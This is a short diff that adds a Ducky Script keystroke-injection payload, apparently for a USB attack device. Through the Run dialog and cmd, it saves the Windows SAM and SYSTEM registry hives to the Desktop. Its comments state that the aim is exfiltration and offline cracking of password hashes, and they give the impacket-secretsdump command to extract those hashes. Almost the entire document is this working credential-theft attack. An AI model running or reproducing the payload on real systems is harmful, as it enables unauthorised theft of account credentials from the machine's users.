@@ -1,0 +1,7 @@
+REM Copy SAM + SYSTEM hive for offline hash cracking
+REM Requires admin. Saves to Desktop for exfil.
+REM Use: impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+GUI r
+DELAY 800
+STRING cmd /k "reg save HKLM\SAM %USERPROFILE%\Desktop\sam.bak /y & reg save HKLM\SYSTEM %USERPROFILE%\Desktop\system.bak /y & echo [+] Hives saved to Desktop"
+ENTER
